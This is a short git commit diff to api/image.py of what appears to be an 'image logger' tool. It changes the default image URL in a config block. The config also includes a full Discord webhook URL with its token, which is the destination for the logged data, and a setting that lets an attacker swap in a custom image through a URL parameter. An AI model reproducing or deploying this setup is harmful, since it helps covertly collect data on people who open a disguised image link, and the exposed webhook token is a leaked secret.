b98255baf82dc0fc55a0ba22cb0c22135ab5d0a6
Enzoooo1945 <kevinschmid102@gmail.com>
2025-02-13 21:20:44 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1339513150336405534/Z22vwvigDt7lumsdx9FILCWDEtg6savQJBguJMSKVNgYs_C6KZHGXO8h5cpeeg_e-Ubg",
-    "image": "https://upload.wikimedia.org/wikipedia/commons/a/a2/Opa.jpg?20110704060926" # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/a/a2/Opa.jpg" # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
